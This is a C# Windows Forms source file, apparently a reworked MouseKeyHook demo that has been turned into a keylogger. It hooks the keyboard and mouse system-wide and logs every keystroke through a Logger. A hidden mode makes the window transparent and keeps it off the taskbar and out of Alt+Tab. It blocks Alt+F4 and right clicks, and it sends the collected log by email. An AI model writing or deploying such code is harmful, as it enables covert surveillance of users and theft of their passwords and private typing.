// This code is distributed under MIT license. 
// Copyright (c) 2015 George Mamaladze
// See license.txt or http://opensource.org/licenses/mit-license.php

using System;
using System.ComponentModel;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using Gma.System.MouseKeyHook.Implementation;

namespace Demo
{
    public partial class Main : Form
    {
        private IKeyboardMouseEvents _mEvents;
        private Logger _logger;
        private EmailService _emailService;

        private Keys _previousKey;
        private bool _isPreviousKeyDown = false;

        public Main()
        {
            InitializeComponent();
            suppressMouseCheckBox.Checked = true;
            suppressAltF4CheckBox.Checked = true;
            SubscribeGlobal();
            FormClosing += Main_Closing;

            if (Properties.Settings.Default.IsHiddenAppMode)
            {
                this.ShowInTaskbar = false;
                this.Opacity = 0;
            }

            _logger = Logger.Instance;
            _emailService = EmailService.Instance;
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }

        private void Main_Closing(object sender, CancelEventArgs e)
        {
            Unsubscribe();
        }

        private void SubscribeGlobal()
        {
            Unsubscribe();
            Subscribe(Hook.GlobalEvents());
        }

        private void Subscribe(IKeyboardMouseEvents events)
        {
            _mEvents = events;
            _mEvents.KeyDown += OnKeyDown;
            _mEvents.KeyUp += OnKeyUp;
            _mEvents.KeyPress += HookManager_KeyPress;

            _mEvents.MouseUp += OnMouseUp;
            _mEvents.MouseClick += OnMouseClick;
            _mEvents.MouseDoubleClick += OnMouseDoubleClick;

            _mEvents.MouseMove += HookManager_MouseMove;

            _mEvents.MouseDragStarted += OnMouseDragStarted;
            _mEvents.MouseDragFinished += OnMouseDragFinished;

            if (checkBoxSupressMouseWheel.Checked)
                _mEvents.MouseWheelExt += HookManager_MouseWheelExt;
            else
                _mEvents.MouseWheel += HookManager_MouseWheel;

            if (suppressMouseCheckBox.Checked)
                _mEvents.MouseDownExt += HookManager_Supress;
            else
                _mEvents.MouseDown += OnMouseDown;
            
        }

        private void Unsubscribe()
        {
            if (_mEvents == null) return;
            _mEvents.KeyDown -= OnKeyDown;
            _mEvents.KeyUp -= OnKeyUp;
            _mEvents.KeyPress -= HookManager_KeyPress;

            _mEvents.MouseUp -= OnMouseUp;
            _mEvents.MouseClick -= OnMouseClick;
            _mEvents.MouseDoubleClick -= OnMouseDoubleClick;

            _mEvents.MouseMove -= HookManager_MouseMove;

            _mEvents.MouseDragStarted -= OnMouseDragStarted;
            _mEvents.MouseDragFinished -= OnMouseDragFinished;

            if (checkBoxSupressMouseWheel.Checked)
                _mEvents.MouseWheelExt -= HookManager_MouseWheelExt;
            else
                _mEvents.MouseWheel -= HookManager_MouseWheel;

            if (suppressMouseCheckBox.Checked)
                _mEvents.MouseDownExt -= HookManager_Supress;
            else
                _mEvents.MouseDown -= OnMouseDown;

            _mEvents.Dispose();
            _mEvents = null;
        }

        private void HookManager_Supress(object sender, MouseEventExtArgs e)
        {
            if (e.Button != MouseButtons.Right)
            {
                Log($"MouseDown \t\t\t {e.Button}\n");
                return;
            }

            Log($"MouseDown \t\t\t {e.Button} Suppressed\n");
            e.Handled = true;
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            if (_previousKey == Keys.LMenu && e.KeyCode == Keys.F4 &&
                _isPreviousKeyDown && suppressAltF4CheckBox.Checked)
            {
                Log($"KeyDown  \t\t\t {e.KeyCode}\n");
                Log("Combination ALT + F4 is suppressed\n");
                e.Handled = true;
            }
            else
            {
                Log($"KeyDown  \t\t\t {e.KeyCode}\n");
            }
            _previousKey = e.KeyCode;
            _isPreviousKeyDown = true;
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            Log($"KeyUp  \t\t\t\t {e.KeyCode}\n");
            _previousKey = e.KeyCode;
            _isPreviousKeyDown = false;
        }

        private void HookManager_KeyPress(object sender, KeyPressEventArgs e)
        {
            Log($"KeyPress \t\t\t\t {e.KeyChar}\n");
        }

        private void HookManager_MouseMove(object sender, MouseEventArgs e)
        {
            labelMousePosition.Text = $"x={e.X:0000}; y={e.Y:0000}";
        }

        private void OnMouseDown(object sender, MouseEventArgs e)
        {
            Log($"MouseDown \t\t\t {e.Button}\n");
        }

        private void OnMouseUp(object sender, MouseEventArgs e)
        {
            Log($"MouseUp \t\t\t {e.Button}\n");
        }

        private void OnMouseClick(object sender, MouseEventArgs e)
        {
            Log($"MouseClick \t\t\t {e.Button}\n");
        }

        private void OnMouseDoubleClick(object sender, MouseEventArgs e)
        {
            Log($"MouseDoubleClick \t\t\t {e.Button}\n");
        }

        private void OnMouseDragStarted(object sender, MouseEventArgs e)
        {
            Log("MouseDragStarted\n");
        }

        private void OnMouseDragFinished(object sender, MouseEventArgs e)
        {
            Log("MouseDragFinished\n");
        }

        private void HookManager_MouseWheel(object sender, MouseEventArgs e)
        {
            labelWheel.Text = $"Wheel={e.Delta:000}";
        }
        
        private void HookManager_MouseWheelExt(object sender, MouseEventExtArgs e)
        {
            labelWheel.Text = $"Wheel={e.Delta:000}";
            Log("Mouse Wheel Move Suppressed.\n");
            e.Handled = true;
        }

        private void Log(string text)
        {
            if (IsDisposed) return;
            textBoxLog.AppendText(text);
            textBoxLog.ScrollToCaret();

            _logger.Log(text);
        }

        private void checkBoxSupressMouseWheel_CheckedChanged(object sender, EventArgs e)
        {
            if (_mEvents == null) return;

            if (((CheckBox) sender).Checked)
            {
                _mEvents.MouseWheel -= HookManager_MouseWheel;
                _mEvents.MouseWheelExt += HookManager_MouseWheelExt;
            }
            else
            {
                _mEvents.MouseWheelExt -= HookManager_MouseWheelExt;
                _mEvents.MouseWheel += HookManager_MouseWheel;
            }
        }

        private void checkBoxSuppressMouse_CheckedChanged(object sender, EventArgs e)
        {
            if (_mEvents == null) return;

            if (((CheckBox)sender).Checked)
            {
                _mEvents.MouseDown -= OnMouseDown;
                _mEvents.MouseDownExt += HookManager_Supress;
            }
            else
            {
                _mEvents.MouseDownExt -= HookManager_Supress;
                _mEvents.MouseDown += OnMouseDown;
            }
        }

        private void ClearLogButton_Click(object sender, EventArgs e)
        {
            textBoxLog.Clear();
        }

        private void SendToEmailButton_Click(object sender, EventArgs e)
        {
            _emailService.SendEmail();
        }
    }
}